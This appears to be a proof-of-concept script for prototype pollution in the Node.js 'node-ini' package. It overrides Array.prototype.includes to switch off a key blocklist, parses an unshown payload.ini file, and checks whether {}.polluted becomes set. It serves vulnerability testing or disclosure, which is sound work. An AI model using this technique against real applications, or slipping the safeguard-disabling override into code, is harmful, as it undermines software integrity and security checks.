Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
const ini = require('node-ini');
console.log({}.polluted);
ini.parse('./payload.ini', function (err, data) {
    console.log({}.polluted);
});